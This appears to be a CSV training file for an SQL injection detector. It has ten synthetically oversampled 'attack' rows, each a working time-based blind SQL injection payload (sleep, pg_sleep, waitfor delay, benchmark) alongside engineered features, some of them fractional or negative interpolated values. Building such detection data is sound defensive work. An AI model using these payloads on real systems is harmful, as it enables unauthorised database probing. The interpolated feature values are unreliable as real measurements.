id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000001,attack,time,"1%"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",nearest_attack_euclidean,R000006,1.2569185709838355,81.81275021837925,23.812750218379243,3.180438553794963,29.406375109189625,2.0,39.0,11.406375109189621,0.3593635240981182,0.02445851754815334,0.47694109218899033,0.1392368661647381,0.0,1.0,0.0,0.0,1.0,0.0,0.0,8.0,0.703187554594811,0.0,0.0,1.0000000000000002,0.0,1.0,0.0,0.703187554594811,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.296812445405189,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.296812445405189
SMOTE_000002,attack,time,1'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000014,1.8296808433548457,91.84398867959948,22.44434536513032,2.913380905355606,29.066607219078193,2.0,48.33303609539096,12.44434536513032,0.3192815595827694,0.022104202902817796,0.5243539571271841,0.13426028038722873,0.6888690730260638,-1.1102230246251565e-16,0.0,0.0,1.0,0.0,0.0,10.066607219078193,0.0,0.0,0.0,1.0000000000000002,0.6888690730260637,0.0,0.0,0.6888690730260638,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.3111309269739362,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.311130926973936
SMOTE_000003,attack,time,"1"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  ",nearest_attack_euclidean,R000016,0.6175147515294931,80.71160869768713,21.489031056482034,3.096793237116355,29.467093169446105,1.8777422358794915,39.12225776412051,10.244515528241017,0.3636824985505652,0.02353592204152792,0.4858997719008742,0.1268818075070327,0.36677329236152617,0.8777422358794913,0.0,0.0,1.0,0.0,0.0,8.0,0.0,0.0,0.0,1.0000000000000002,0.12225776412050865,0.8777422358794913,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000004,attack,time,1   )    )    as dhqt where 8485  =  8485 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000024,2.9599709720615803,62.48483424688489,24.68560428086061,3.8342874664755318,21.428021404303053,11.37120856172122,21.31439571913939,8.37120856172122,0.3418812965185819,0.1817302417137006,0.34284863766787527,0.13353982409984222,1.3712085617212204,0.31439571913938974,2.0,0.0,0.0,1.0,0.0,2.3143957191393896,0.0,0.0,0.0,3.0,0.6856042808606102,0.3143957191393898,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.3143957191393898,0.0,0.0,0.0,0.0,0.0,0.0,0.3143957191393898,0.0,0.6856042808606101,0.6856042808606101,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000005,attack,time,"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000013,0.1749119648534008,65.24234454608401,23.181758409563013,3.5038078278997444,19.242344546084016,10.0,27.060586136521003,8.939413863478997,0.2947932773957335,0.15330580926179707,0.41480374495643185,0.1370971683860376,0.0,0.9394138634789961,2.0,0.0,0.0,1.0,0.0,4.0,0.0,1.0,0.0,3.0,0.0,0.939413863478996,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000006,attack,time,"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",nearest_attack_euclidean,R000029,1.5950755000838421,72.64653839251416,26.32326919625708,3.682323210230772,16.293076785028315,21.32326919625708,27.030192411228764,8.0,0.22398713450343963,0.2934868761050511,0.37238565664753653,0.11014033274397274,0.6767308037429214,-1.1102230246251565e-16,0.6465383925141572,0.0,0.0,1.0,0.0,4.676730803742921,0.0,0.0,1.0,1.6465383925141572,0.6767308037429213,0.0,0.3232691962570786,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.32326919625707856,0.6767308037429214,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000007,attack,time,"1  )   where 2044  =  2044 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000010,1.2361905070019141,78.68124998778403,23.050781242365012,3.379801678586737,16.891406236257026,18.0,33.789843751526995,10.0,0.21320390074484807,0.2291424752054832,0.4303522489355114,0.12730137511415732,0.0,0.21015624847300274,2.0,0.0,0.0,2.0,0.0,4.789843751526997,0.0,0.21015624847300274,0.7898437515269973,4.0,0.0,0.2101562484730027,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.21015624847300274,0.0,1.0,0.21015624847300268,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7898437515269974,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.2101562484730026
SMOTE_000008,attack,time,1  )   where 9649  =  9649 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000020,1.5514023019387766,83.14432554136759,26.628865108273516,3.5787361795576196,23.354638129928222,15.806184173237629,34.25773021654703,9.725773021654703,0.2817622723349317,0.1873433702302171,0.4122830212749799,0.11861133615987135,0.0,0.27422697834529647,2.0,0.0,0.0,1.7257730216547034,0.0,4.725773021654703,0.0,1.0,0.0,3.725773021654703,0.0,0.2742269783452965,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.7257730216547036,1.0,0.7257730216547035,0.2742269783452965,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.7257730216547036
SMOTE_000009,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000002,2.2951146552076773,77.60438683184451,25.100731138640754,3.3315091529131817,19.550365569320377,10.0,36.50365569320376,11.550365569320377,0.2529429162763789,0.12963789779086288,0.4681865878890696,0.1492325980436886,0.5503655693203761,0.44963443067962394,2.0,0.0,0.0,1.0,0.0,6.100731138640752,0.449634430679624,1.0,0.0,3.0,0.550365569320376,0.44963443067962405,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.5503655693203761,0.4496344306796239,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000010,attack,time,1'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000014,1.8489453620563758,91.76864378302315,22.42796603978764,2.9135676650718305,29.056779623872586,2.0,48.283898119362924,12.427966039787641,0.3194526673674497,0.022124230786011917,0.5242381437156702,0.1341849581308682,0.6855932079575282,-1.1102230246251565e-16,0.0,0.0,1.0,0.0,0.0,10.056779623872586,0.0,0.0,0.0,1.0000000000000002,0.6855932079575282,0.0,0.0,0.6855932079575282,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.3144067920424718,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.314406792042472
